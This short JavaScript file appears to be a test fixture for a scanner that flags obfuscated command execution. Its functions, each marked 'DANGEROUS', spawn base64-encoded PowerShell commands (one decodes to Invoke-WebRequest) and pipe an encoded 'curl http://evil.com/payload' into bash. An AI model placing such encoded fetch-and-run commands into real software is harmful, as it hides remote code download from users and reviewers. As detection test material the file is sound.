const { spawn } = require('child_process');

// DANGEROUS: Encoded PowerShell command
function runEncodedPowerShell() {
  const child = spawn('powershell', [
    '-encodedCommand',
    'SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AA=='
  ]);
}

// DANGEROUS: PowerShell with -enc flag
function shortEncodedPowerShell() {
  spawn('powershell', ['-enc', 'base64encodedpayloadhere']);
}

// DANGEROUS: Base64 decoded bash command
function decodedBashCommand() {
  const { exec } = require('child_process');
  exec('echo Y3VybCBodHRwOi8vZXZpbC5jb20vcGF5bG9hZCA= | base64 -d | bash');
}

module.exports = { runEncodedPowerShell, shortEncodedPowerShell, decodedBashCommand };
